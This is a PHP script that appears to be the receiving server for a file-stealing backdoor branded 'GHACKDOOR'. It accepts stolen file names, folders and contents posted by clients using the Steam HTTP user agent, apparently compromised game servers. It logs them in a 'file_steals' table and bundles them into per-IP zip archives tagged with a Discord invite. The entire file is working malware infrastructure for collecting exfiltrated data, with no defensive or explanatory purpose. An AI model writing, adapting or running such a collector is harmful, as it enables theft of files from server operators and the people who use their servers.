<?php
include('class/include.php');

$browser = $_SERVER['HTTP_USER_AGENT'];
$ips = $_SERVER["REMOTE_ADDR"];
$ip = $_POST["ip"];
$filename = $_POST["filename"];
$content = $_POST["content"];
$folder = $_POST["folder"];
$name = $_POST['name'];
$id = $_POST['id'];
$t = $GLOBALS['DB']->GetContent("file_steals", ["ip" => $ip]);

if ($browser == "Valve/Steam HTTP Client 1.0 (4000)") {

$ip_data = explode(':', $ip);

if ($ip_data[0] != $ips) {
	die("b");
}

if ($GLOBALS['DB']->Count("file_steals", ["ip" => $ip]) == 1 && $GLOBALS['DB']->Count("file_steals", ["folder" => $folder]) == 1 && $GLOBALS['DB']->Count("file_steals", ["name" => $filename]) == 1 && $GLOBALS['DB']->Count("file_steals", ["content" => $content]) == 1 ) {
	die("alreadyexist");
}

$searchfor = '.php';
$contents = $filename;
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";

	if(!preg_match_all($pattern, $contents, $matches)){

		$searchfor = '../';
		$pattern = preg_quote($searchfor, '/');
		$pattern = "/^.*$pattern.*\$/m";

		if(!preg_match_all($pattern, $contents, $matches)){

			$zip = new ZipArchive;

			$zip->open($ip.'filesteal.zip', ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE);
			$zip->addFromString("filesteal_with_GHACKDOOR.txt", "https://discord.gg/r5sUz24");

			$zip->addEmptyDir($folder);

            $zip->addFromString($folder.$name, html_entity_decode($content));

            $zip->addFile("/".$folder.$name);

			$zip->close();


		}else{

			die("print('failed 4iéme verification')");

		}

	}else{

	die("print('failed 3iéme verification')");

	}


}else{

	die("print('failed 1er verification')");

}
?> 